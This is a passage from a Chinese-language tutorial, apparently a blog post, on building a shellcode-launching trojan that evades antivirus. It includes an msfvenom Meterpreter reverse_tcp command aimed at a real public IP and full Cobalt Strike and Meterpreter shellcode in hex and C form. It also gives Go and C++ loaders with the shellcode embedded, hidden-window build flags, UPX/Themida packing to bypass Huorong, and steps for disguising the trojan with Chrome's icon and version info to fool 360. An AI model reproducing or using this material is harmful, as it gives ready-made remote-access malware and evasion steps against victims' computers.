：存放源码文件</li></ul><blockquote><ul><li>项目1</li></ul><blockquote><p>模块1<br>模块2</p></blockquote><ul><li>项目2</li></ul><blockquote><p>模块1<br>模块2</p></blockquote><ul><li>shellcode-launch</li></ul></blockquote><ul><li>bin ：存放编译后生成的二进制可执行文件</li><li>pkg ：存放编译后生成的归档文件（go module）</li></ul><h2 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h2><h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/jax777/shellcode<span class="literal">-launch</span>.git</span><br><span class="line"><span class="built_in">cd</span> shellcode<span class="literal">-launch</span></span><br></pre></td></tr></table></figure><h3 id="MSF或CS生成C的shellcode"><a href="#MSF或CS生成C的shellcode" class="headerlink" title="MSF或CS生成C的shellcode"></a>MSF或CS生成C的shellcode</h3><blockquote><p>我们如果需要借助shellcode-launch上线msf就要有一串上线msf的shellcode~，cs亦是同理</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#msf</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.223.217.243 lport=4567 -f c -o shellcode.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cs</span><br><span class="line">attack -&gt; payload -&gt;</span><br><span class="line">payload选择c或者raw（原始的）</span><br><span class="line"></span><br><span class="line">#如：</span><br><span class="line">#raw：</span><br><span class="line">fc48 83e4 f0e8 c800 0000 4151 4150 5251</span><br><span class="line">5648 31d2 6548 8b52 6048 8b52 1848 8b52</span><br><span class="line">2048 8b72 5048 0fb7 4a4a 4d31 c948 31c0</span><br><span class="line">ac3c 617c 022c 2041 c1c9 0d41 01c1 e2ed</span><br><span class="line">5241 5148 8b52 208b 423c 4801 d066 8178</span><br><span class="line">180b 0275 728b 8088 0000 0048 85c0 7467</span><br><span class="line">4801 d050 8b48 1844 8b40 2049 01d0 e356</span><br><span class="line">48ff c941 8b34 8848 01d6 4d31 c948 31c0</span><br><span class="line">ac41 c1c9 0d41 01c1 38e0 75f1 4c03 4c24</span><br><span class="line">0845 39d1 75d8 5844 8b40 2449 01d0 6641</span><br><span class="line">8b0c 4844 8b40 1c49 01d0 418b 0488 4801</span><br><span class="line">d041 5841 585e 595a 4158 4159 415a 4883</span><br><span class="line">ec20 4152 ffe0 5841 595a 488b 12e9 4fff</span><br><span class="line">ffff 5d6a 0049 be77 696e 696e 6574 0041</span><br><span class="line">5649 89e6 4c89 f141 ba4c 7726 07ff d548</span><br><span class="line">31c9 4831 d24d 31c0 4d31 c941 5041 5041</span><br><span class="line">ba3a 5679 a7ff d5eb 735a 4889 c141 b861</span><br><span class="line">1e00 004d 31c9 4151 4151 6a03 4151 41ba</span><br><span class="line">5789 9fc6 ffd5 eb59 5b48 89c1 4831 d249</span><br><span class="line">89d8 4d31 c952 6800 0240 8452 5241 baeb</span><br><span class="line">552e 3bff d548 89c6 4883 c350 6a0a 5f48</span><br><span class="line">89f1 4889 da49 c7c0 ffff ffff 4d31 c952</span><br><span class="line">5241 ba2d 0618 7bff d585 c00f 859d 0100</span><br><span class="line">0048 ffcf 0f84 8c01 0000 ebd3 e9e4 0100</span><br><span class="line">00e8 a2ff ffff 2f51 7345 5400 354f 2150</span><br><span class="line">2540 4150 5b34 5c50 5a58 3534 2850 5e29</span><br><span class="line">3743 4329 377d 2445 4943 4152 2d53 5441</span><br><span class="line">4e44 4152 442d 414e 5449 5649 5255 532d</span><br><span class="line">5445 5354 2d46 494c 4521 2448 2b48 2a00</span><br><span class="line">354f 2150 2500 5573 6572 2d41 6765 6e74</span><br><span class="line">3a20 4d6f 7a69 6c6c 612f 352e 3020 2863</span><br><span class="line">6f6d 7061 7469 626c 653b 204d 5349 4520</span><br><span class="line">392e 303b 2057 696e 646f 7773 204e 5420</span><br><span class="line">362e 313b 2057 696e 3634 3b20 7836 343b</span><br><span class="line">2054 7269 6465 6e74 2f35 2e30 290d 0a00</span><br><span class="line">354f 2150 2540 4150 5b34 5c50 5a58 3534</span><br><span class="line">2850 5e29 3743 4329 377d 2445 4943 4152</span><br><span class="line">2d53 5441 4e44 4152 442d 414e 5449 5649</span><br><span class="line">5255 532d 5445 5354 2d46 494c 4521 2448</span><br><span class="line">2b48 2a00 354f 2150 2540 4150 5b34 5c50</span><br><span class="line">5a58 3534 2850 5e29 3743 4329 377d 2445</span><br><span class="line">4943 4152 2d53 5441 4e44 4152 442d 414e</span><br><span class="line">5449 5649 5255 532d 5445 5354 2d46 494c</span><br><span class="line">4521 2448 2b48 2a00 354f 2150 2540 4150</span><br><span class="line">5b34 5c50 5a58 3534 2850 5e29 3743 4329</span><br><span class="line">377d 2445 4943 4152 2d53 5441 4e44 4152</span><br><span class="line">442d 414e 5449 5649 5255 532d 5445 5354</span><br><span class="line">2d46 494c 4521 2448 2b48 2a00 354f 2150</span><br><span class="line">2540 4150 5b00 41be f0b5 a256 ffd5 4831</span><br><span class="line">c9ba 0000 4000 41b8 0010 0000 41b9 4000</span><br><span class="line">0000 41ba 58a4 53e5 ffd5 4893 5353 4889</span><br><span class="line">e748 89f1 4889 da41 b800 2000 0049 89f9</span><br><span class="line">41ba 1296 89e2 ffd5 4883 c420 85c0 74b6</span><br><span class="line">668b 0748 01c3 85c0 75d7 5858 5848 0500</span><br><span class="line">0000 0050 c3e8 9ffd ffff 3132 342e 3232</span><br><span class="line">332e 3231 372e 3234 3300 0000 0000 </span><br><span class="line"></span><br><span class="line">#c语言，在每个16进制前面加了\x，还原的话去掉\x，然后逐个转换为十进制即可~~~</span><br><span class="line">\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x61\x1e\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4b\x57\x77\x44\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x43\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x45\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x32\x34\x2e\x32\x32\x33\x2e\x32\x31\x37\x2e\x32\x34\x33\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209112203603.png" alt="image-20220911220316439" style="zoom:67%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209112206243.png" alt="image-20220911220630058" style="zoom:67%;" /></p><h3 id="修改winlaunch-go"><a href="#修改winlaunch-go" class="headerlink" title="修改winlaunch.go"></a>修改winlaunch.go</h3><blockquote><p>winlaunch.go和linuxlaunch.go文件就是加载shellcode的文件</p></blockquote><p>把生成的 shellcode 内容填入sc</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    sc := []<span class="type">byte</span>(<span class="string">&quot;shellcode填到这里&quot;</span>)</span><br><span class="line">    winshellcode.Run(sc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;shellcode-launch/winshellcode&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">sc := []<span class="type">byte</span>(<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x61\x1e\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4b\x57\x77\x44\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x43\x3b\x20\x2e\x4e\x45\x54\x34\x2e\x30\x45\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x32\x34\x2e\x32\x32\x33\x2e\x32\x31\x37\x2e\x32\x34\x33\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">winshellcode.Run(sc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编译生成exe"><a href="#编译生成exe" class="headerlink" title="编译生成exe"></a>编译生成exe</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> CGO_ENABLED=<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> GOOS=windows</span><br><span class="line"><span class="built_in">set</span> GOARCH=amd64</span><br><span class="line">go build <span class="literal">-ldflags</span>=<span class="string">&quot;-s -w&quot;</span> <span class="literal">-o</span> shellcode<span class="literal">-launch-attack</span>.exe winlaunch.go</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#减少文件体积</span></span><br><span class="line">go build <span class="literal">-ldflags</span>=<span class="string">&quot;-s -w&quot;</span> <span class="literal">-o</span> <span class="number">1</span>.exe winlaunch.go</span><br><span class="line"><span class="comment">#减少文件体积+隐藏窗口</span></span><br><span class="line">go build <span class="literal">-ldflags</span>=<span class="string">&quot;-s -w -H=windowsgui&quot;</span> <span class="literal">-o</span> <span class="number">2</span>.exe winlaunch.go</span><br><span class="line"><span class="comment">#可选参数 -ldflags  是编译选项：</span></span><br><span class="line"><span class="comment"># -s -w  去掉调试信息，可以减小构建后文件体积，</span></span><br><span class="line"><span class="comment"># -H=windowsgui  隐藏文件执行窗口</span></span><br></pre></td></tr></table></figure><h3 id="过火绒"><a href="#过火绒" class="headerlink" title="过火绒"></a>过火绒</h3><p>随意加壳（亲测可用）：</p><blockquote><ul><li><p>upx壳，静态查杀可直接绕过,shellcode-launch目录下面带了upx.exe</p><blockquote><ul><li><a href="https://github.com/upx/upx/releases/">https://github.com/upx/upx/releases/</a></li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\upx64.exe .\shellcode<span class="literal">-launch-attack</span>.exe</span><br></pre></td></tr></table></figure></blockquote></li><li><p>Themida ,图形化加壳程序，拖进去即可，然后protect开始加壳</p><blockquote><ul><li><a href="https://down.52pojie.cn/Tools/Packers/Themida_x32_x64_v3.0.4.0_Repacked.rar">https://down.52pojie.cn/Tools/Packers/Themida_x32_x64_v3.0.4.0_Repacked.rar</a></li><li><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1344654">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1344654</a></li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209150858295.png" alt="image-20220915085838916" style="zoom:30%;" /></li></ul></blockquote><h3 id="过360"><a href="#过360" class="headerlink" title="过360"></a>过360</h3><p>修改资源&#x2F;修改图标：</p><blockquote><ul><li>restorator 下载地址：<a href="https://www.jb51.net/softs/619405.html">https://www.jb51.net/softs/619405.html</a></li><li><a href="https://www.52pojie.cn/thread-501557-1-1.html">聊聊Restorator的天坑 - 『脱壳破解区』 - 吾爱破解 </a></li></ul><p>restorator 用于修改可执行程序的图标界面版本等信息，直接拖进来即可操作.</p><p>这个软件还是小心使用~~</p><p>可能出现的问题：</p><blockquote><ul><li>若是无法创建 可能是源文件的问题~重新生成木马试试</li><li>加壳后可能无法创建成功</li></ul></blockquote></blockquote><p>使用 restorator  给 木马exe  执行程序添加图标、界面、版本等资源信息，然后保存。即可过360。</p><p>将木马程序和伪造的目标程序拖进来，将目标程序的资源都复制给木马程序~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171531979.png" alt="image-20220917153107754" style="zoom:50%;" /><p>再把chrome都移除删掉，然后保存伪造的shellcode.exe~~很逼真</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171614609.png" alt="image-20220917161407391" style="zoom:50%;" /><p>在任务管理器中：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171631847.png" alt="image-20220917163103657"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171632222.png" alt="image-20220917163220053"></p><p>另外 msinfo32查看进程，查看其是否成功的替换信息，有了版本信息等</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171633380.png" alt="image-20220917163350160"></p><h1 id="shellcode-loader"><a href="#shellcode-loader" class="headerlink" title="shellcode loader"></a>shellcode loader</h1><p>为了使我们的 shellcode 加载到内存并执行，我们需要 shellcode 加载器，也就是我们的 shellcode loader ，不同语言 loader 的写法不同。<br>shellcode 这个东西我们明白是一串可执行的二进制，那么我们先通过其他的手段开辟一片拥有可读可写可执行权限的区域放入我们的 shellcode，然后跳转到 shellcode 首地址去执行就行了</p><blockquote><p>这里怎么理解呢？开辟一片拥有可读可写可执行权限的区域就类似我们定义变量<code>int a；</code>为a申请的一片变量空间，此处不同的地方在于这片区域是具有可执行权限的！</p><p>另外怎么开辟呢？我们利用高级语言调用api执行这个操作</p></blockquote><h1 id="shellcodeLoader-c-x2F-c"><a href="#shellcodeLoader-c-x2F-c" class="headerlink" title="shellcodeLoader-c&#x2F;c++"></a>shellcodeLoader-c&#x2F;c++</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><blockquote><p>这串代码的shellcode还是很明显，已经无法免杀，这只是一个简单的shellcode代码。此时我们就只能通过对shellcode进行加密混淆，逃避杀软检测~~下节讲</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)  </span></span><br><span class="line"><span class="comment">//隐藏控制台窗口（一）</span></span><br><span class="line"><span class="comment">// msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.223.217.243 lport=4321 -f c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x1a\x0a\x8b\x9b\x31\x2b\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span 